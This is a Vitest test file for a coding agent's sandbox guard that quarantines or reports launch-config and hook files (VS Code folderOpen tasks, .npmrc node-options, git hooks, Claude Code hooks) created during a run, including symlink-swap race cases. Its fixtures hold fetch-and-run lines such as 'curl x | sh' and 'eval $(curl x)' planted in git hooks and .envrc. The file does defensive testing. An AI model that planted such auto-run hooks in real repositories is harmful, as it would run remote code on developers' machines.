import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  renameSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { FakeSandboxRunner } from "@psyche/testing";
import { Type } from "@sinclair/typebox";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  type AgentToolRegistration,
  codingTools,
  defineTool,
  keepQuarantined,
  type LaunchConfigReport,
  type ToolRunContext,
} from "../src/index.ts";

/**
 * #1434 reviews r1 and r2: `code.run` and app launch config, judged over the run window. New
 * entries go to a quarantine (never deleted), changes to existing ones are only reported.
 */

let dir: string;
let repo: string;
let quarantine: string;

beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "psyche-guard-")));
  repo = join(dir, "repo");
  quarantine = join(dir, "psyche-home", "quarantine", "code-run");
  mkdirSync(join(repo, "src"), { recursive: true });
  writeFileSync(join(repo, "src", "a.js"), "export const a = 1;\n");
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

const ctx = (): ToolRunContext => ({
  callId: "c1",
  threadId: "thr_1",
  runId: "run_1",
  taskId: "task_1",
  taint: false,
  permissionMode: "balanced",
  mode: "attended",
  signal: new AbortController().signal,
  onUpdate: () => undefined,
});

function fileTools() {
  const read = defineTool({
    name: "read_file",
    description: "read",
    input: Type.Object({ path: Type.String() }),
    sideEffect: "read",
    provenanceOut: "untrusted",
    async run(p) {
      return { output: { text: await readFile(p.path, "utf8") }, provenance: "untrusted" };
    },
  });
  const write = defineTool({
    name: "write_file",
    description: "write",
    input: Type.Object({ path: Type.String(), content: Type.String() }),
    sideEffect: "write",
    async run(p) {
      writeFileSync(p.path, p.content);
      return { output: { path: p.path }, provenance: "trusted" };
    },
  });
  return { read, write };
}

function setup(runner = new FakeSandboxRunner(), maxDirs?: number) {
  const reports: LaunchConfigReport[] = [];
  const recreated: string[] = [];
  const tools = codingTools({
    files: fileTools(),
    folders: () => [{ path: dir, mode: "rw" }],
    runner,
    launchConfig: {
      quarantineDir: quarantine,
      report: (r) => reports.push(r),
      recreated: ({ root }) => recreated.push(root),
      ...(maxDirs === undefined ? {} : { maxDirs }),
    },
  });
  const byName = new Map(tools.map((t) => [t.spec.name, t]));
  const use = async (name: string, params: unknown) =>
    (await (byName.get(name) as AgentToolRegistration).run?.(params, ctx())) as {
      output: Record<string, unknown>;
    };
  return { use, runner, reports, recreated };
}

/** A scripted command that changes the host, as a real mount would. */
function acts(runner: FakeSandboxRunner, argv0: string, effect: () => void) {
  runner.script((r) => {
    if (r.argv[0] !== argv0) return false;
    effect();
    return true;
  }, {});
}

const put = (rel: string, text = "x") => {
  mkdirSync(dirname(join(repo, rel)), { recursive: true });
  writeFileSync(join(repo, rel), text);
};

describe("code.run and launch config", () => {
  it("moves what a run created into the quarantine, and Keep it puts it back", async () => {
    const { use, runner, reports } = setup();
    acts(runner, "plant", () => {
      put(".vscode/tasks.json", '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}');
      put(".obsidian/plugins/x/main.js", "require('child_process')");
      put("packages/web/.npmrc", "node-options=--require ./x.js");
      put("src/ok.js", "export const ok = 1;\n");
    });
    await use("code.open", { path: repo });
    const r = await use("code.run", { root: repo, argv: ["plant"] });
    for (const rel of [".vscode", ".obsidian", "packages/web/.npmrc"]) {
      expect(existsSync(join(repo, rel)), rel).toBe(false);
    }
    expect(readFileSync(join(repo, "src/ok.js"), "utf8")).toContain("ok");
    const report = reports[0] as LaunchConfigReport;
    expect([...report.quarantined].sort()).toEqual([".obsidian", ".vscode", "packages/web/.npmrc"]);
    // Held, never deleted.
    const held = join(quarantine, report.quarantineId as string, "entries");
    expect(readFileSync(join(held, ".vscode/tasks.json"), "utf8")).toContain("folderOpen");
    expect((r.output.launchConfig as { notice: string }).notice).toMatch(/code\.edit/);

    const kept = await keepQuarantined(quarantine, report.quarantineId as string);
    expect(kept.kept.sort()).toEqual([".obsidian", ".vscode", "packages/web/.npmrc"]);
    expect(readFileSync(join(repo, ".vscode/tasks.json"), "utf8")).toContain("folderOpen");
    expect(readdirSync(quarantine)).toEqual([]);
  });

  it("keeps an entry held when its name was taken since, and says which", async () => {
    const { use, runner, reports } = setup();
    acts(runner, "plant", () => put(".envrc", "eval $(curl x)"));
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["plant"] });
    const id = reports[0]?.quarantineId as string;
    put(".envrc", "use node\n");
    await expect(keepQuarantined(quarantine, id)).rejects.toMatchObject({ code: "conflict" });
    expect(readFileSync(join(repo, ".envrc"), "utf8")).toBe("use node\n");
    expect(existsSync(join(quarantine, id, "entries", ".envrc"))).toBe(true);
    await expect(keepQuarantined(quarantine, "../../etc")).rejects.toMatchObject({
      code: "invalid_params",
    });
  });

  it("mounts existing folders read-only and only reports changes to existing entries", async () => {
    put(".vscode/settings.json", "{}\n");
    put(".idea/workspace.xml", "<project/>\n");
    put(".npmrc", "save-exact=true\n");
    put(".claude/settings.local.json", '{"permissions":{"allow":[]}}\n');
    put(".envrc", "use node\n");
    put(".idea/runConfigurations/test.xml", "<component/>\n");
    const { use, runner, reports } = setup();
    acts(runner, "work", () => {
      // The owner's IDE and Claude Code keep writing during the run.
      put(".idea/workspace.xml", "<project><component/></project>\n");
      put(".idea/runConfigurations/test.xml", "<component><option/></component>\n");
      put(".claude/settings.local.json", '{"permissions":{"allow":["Bash(pnpm test)"]}}\n');
      put(".npmrc", "save-exact=false\n");
      rmSync(join(repo, ".envrc"));
    });
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["work"] });
    const sbx = runner.execs[0]?.sandboxId as string;
    const mounts = (
      await runner.ensureSandbox(
        {
          kind: "project",
          id: (await use("code.open", { path: repo })).output.workspace as string,
        },
        {
          mounts: [
            { source: repo, target: "/workspace/repo", readOnly: false },
            { source: join(repo, ".claude"), target: "/workspace/repo/.claude", readOnly: true },
            { source: join(repo, ".idea"), target: "/workspace/repo/.idea", readOnly: true },
            { source: join(repo, ".vscode"), target: "/workspace/repo/.vscode", readOnly: true },
          ],
        },
      )
    ).id;
    expect(mounts).toBe(sbx);
    // Nothing moved or reverted: the owner's edits stand.
    expect(readFileSync(join(repo, ".claude/settings.local.json"), "utf8")).toContain("pnpm test");
    expect(readFileSync(join(repo, ".idea/workspace.xml"), "utf8")).toContain("component");
    expect(readFileSync(join(repo, ".npmrc"), "utf8")).toBe("save-exact=false\n");
    expect(existsSync(join(repo, ".envrc"))).toBe(false);
    expect(reports[0]?.quarantined).toEqual([]);
    // JetBrains' workspace state is noise; its run configurations are not.
    expect(reports[0]?.changed).toEqual([
      ".claude/settings.local.json",
      ".envrc",
      ".idea/runConfigurations/test.xml",
      ".npmrc",
    ]);
    expect(reports[0]?.fingerprints[".envrc"]).toBe("gone");
    expect(reports[0]?.fingerprints[".npmrc"]).toMatch(/^file:/);
  });

  // #1435 review r1, B2: Claude Code hooks in the worktrees under `.claude`.
  it("mounts .claude read-only whole, and holds a .claude the run made", async () => {
    put(".claude/worktrees/wt1/src/a.ts");
    const { use, runner } = setup();
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["true"] });
    const id = (await use("code.open", { path: repo })).output.workspace as string;
    const sbx = await runner.ensureSandbox(
      { kind: "project", id },
      {
        mounts: [
          { source: repo, target: "/workspace/repo", readOnly: false },
          { source: join(repo, ".claude"), target: "/workspace/repo/.claude", readOnly: true },
        ],
      },
    );
    expect(sbx.id).toBe(runner.execs[0]?.sandboxId);

    rmSync(join(repo, ".claude"), { recursive: true });
    const fresh = setup();
    acts(fresh.runner, "plant", () =>
      put(".claude/worktrees/wt1/.claude/settings.json", '{"hooks":{"PreToolUse":[]}}'),
    );
    await fresh.use("code.open", { path: repo });
    await fresh.use("code.run", { root: repo, argv: ["plant"] });
    expect(existsSync(join(repo, ".claude"))).toBe(false);
    expect(fresh.reports[0]?.quarantined).toEqual([".claude"]);
  });

  // #1435 review r1, item 3: a folder swapped for a link between the check and the move.
  it("never moves something of the owner's in through a swapped folder", async () => {
    const other = join(dir, "OtherProject");
    mkdirSync(join(other, ".vscode"), { recursive: true });
    writeFileSync(join(other, ".vscode", "settings.json"), "owner's");
    put("sub/readme.md");
    const reports: LaunchConfigReport[] = [];
    const runner = new FakeSandboxRunner();
    const tools = codingTools({
      files: fileTools(),
      folders: () => [{ path: dir, mode: "rw" }],
      runner,
      launchConfig: {
        quarantineDir: quarantine,
        report: (r) => reports.push(r),
        beforeMove: () => {
          // A process still running in the sandbox swaps the folder for a link.
          renameSync(join(repo, "sub"), join(repo, "sub-was"));
          symlinkSync(other, join(repo, "sub"));
        },
      },
    });
    const byName = new Map(tools.map((t) => [t.spec.name, t]));
    const use = (name: string, params: unknown) =>
      (byName.get(name) as AgentToolRegistration).run?.(params, ctx());
    acts(runner, "plant", () => put("sub/.vscode/tasks.json", "{}"));
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["plant"] });
    expect(readFileSync(join(other, ".vscode", "settings.json"), "utf8")).toBe("owner's");
    expect(reports[0]?.unmoved).toEqual(["sub/.vscode"]);
    expect(reports[0]?.quarantined).toEqual([]);
  });

  it("Keep it never puts an entry back through a swapped folder", async () => {
    const { use, runner, reports } = setup();
    acts(runner, "plant", () => put("sub/.vscode/tasks.json", "{}"));
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["plant"] });
    const id = reports[0]?.quarantineId as string;
    const other = join(dir, "OtherProject");
    mkdirSync(other);
    await expect(
      keepQuarantined(quarantine, id, {
        beforeMove: () => {
          renameSync(join(repo, "sub"), join(repo, "sub-was"));
          symlinkSync(other, join(repo, "sub"));
        },
      }),
    ).rejects.toMatchObject({ code: "conflict" });
    expect(existsSync(join(other, ".vscode"))).toBe(false);
    expect(existsSync(join(quarantine, id, "entries", "sub/.vscode/tasks.json"))).toBe(true);
  });

  // #1435 review r1, items 4 and 5.
  it("refuses a repository with more read-only folders than one sandbox takes", async () => {
    for (let i = 0; i < 24; i++) put(`p${i}/.vscode/settings.json`);
    put(".claude/settings.json");
    const { use, runner } = setup();
    await use("code.open", { path: repo });
    await expect(use("code.run", { root: repo, argv: ["true"] })).rejects.toMatchObject({
      code: "forbidden",
      details: { reason: "launch_config_too_many", count: 25 },
    });
    expect(runner.execs).toHaveLength(0);
  });

  it("mounts a vendored clone's .git read-only and watches its hooks", async () => {
    put("vendor/lib/.git/config", "[core]\n");
    put("vendor/lib/.git/hooks/pre-commit.sample", "#!/bin/sh\n");
    put("vendor/lib/.git/objects/ab/cd", "x");
    const { use, runner, reports } = setup();
    acts(runner, "tamper", () => put("vendor/lib/.git/hooks/post-checkout", "curl x | sh"));
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["tamper"] });
    const id = (await use("code.open", { path: repo })).output.workspace as string;
    const sbx = await runner.ensureSandbox(
      { kind: "project", id },
      {
        mounts: [
          { source: repo, target: "/workspace/repo", readOnly: false },
          {
            source: join(repo, "vendor/lib/.git"),
            target: "/workspace/repo/vendor/lib/.git",
            readOnly: true,
          },
        ],
      },
    );
    expect(sbx.id).toBe(runner.execs[0]?.sandboxId);
    expect(reports[0]?.changed).toEqual(["vendor/lib/.git/hooks/post-checkout"]);
    expect(reports[0]?.quarantined).toEqual([]);
  });

  it("reports a change under .git's config, hooks and info, and a replaced link", async () => {
    put(".git/config", "[core]\n");
    put(".git/hooks/pre-commit.sample", "#!/bin/sh\n");
    mkdirSync(join(dir, "dotfiles", "obsidian"), { recursive: true });
    symlinkSync(join(dir, "dotfiles", "obsidian"), join(repo, ".obsidian"));
    const { use, runner, reports } = setup();
    acts(runner, "tamper", () => {
      put(".git/hooks/pre-commit", "#!/bin/sh\ncurl x | sh\n");
      rmSync(join(repo, ".obsidian"));
      put(".obsidian/plugins/x/main.js");
    });
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["tamper"] });
    expect(reports[0]?.changed).toEqual(
      expect.arrayContaining([".git/hooks/pre-commit", ".obsidian"]),
    );
    // A replaced entry is not moved: it may be the owner's.
    expect(existsSync(join(dir, "dotfiles", "obsidian"))).toBe(true);
    expect(existsSync(join(repo, ".obsidian/plugins/x/main.js"))).toBe(true);
  });

  it("skips build and cache folders, and falls back to the top levels over the limit", async () => {
    put("node_modules/pkg/.npmrc");
    put("target/debug/.vscode/x.json");
    put(".claude/worktrees/agent-1/.vscode/settings.json");
    const { use, runner, reports } = setup();
    acts(runner, "build", () => {
      put("node_modules/other/.npmrc");
      put(".claude/worktrees/agent-2/.husky/pre-commit");
    });
    await use("code.open", { path: repo });
    const r = await use("code.run", { root: repo, argv: ["build"] });
    expect(reports).toEqual([]);
    expect(r.output.launchConfig).toBeUndefined();

    for (let i = 0; i < 6; i++) put(`deep/d${i}/e/f.txt`);
    const small = setup(new FakeSandboxRunner(), 4);
    acts(small.runner, "plant", () => {
      put(".husky/pre-commit");
      put("deep/d1/e/.npmrc");
    });
    await small.use("code.open", { path: repo });
    await small.use("code.run", { root: repo, argv: ["plant"] });
    const report = small.reports[0] as LaunchConfigReport;
    expect(report.partial).toBe(true);
    // The top levels were checked; deeper ones were not walked.
    expect(report.quarantined).toEqual([".husky"]);
  });

  it("makes the sandbox again when the mounts changed, and says so", async () => {
    const { use, runner, recreated } = setup();
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["true"] });
    // The owner opens the repository in an IDE, which adds its folder.
    put(".idea/workspace.xml");
    await use("code.run", { root: repo, argv: ["true"] });
    expect(runner.execs[1]?.sandboxId).not.toBe(runner.execs[0]?.sandboxId);
    expect(recreated).toEqual([repo]);
  });

  it("never runs on the sandbox PC with nested read-only folders", async () => {
    put(".git/config", "[core]\n");
    const { use, runner } = setup(new FakeSandboxRunner({ backend: "vm" }));
    await use("code.open", { path: repo });
    await expect(use("code.run", { root: repo, argv: ["true"] })).rejects.toMatchObject({
      code: "unavailable",
      details: { reason: "nested_mounts_unsupported" },
    });
    expect(runner.execs).toHaveLength(0);
  });
});
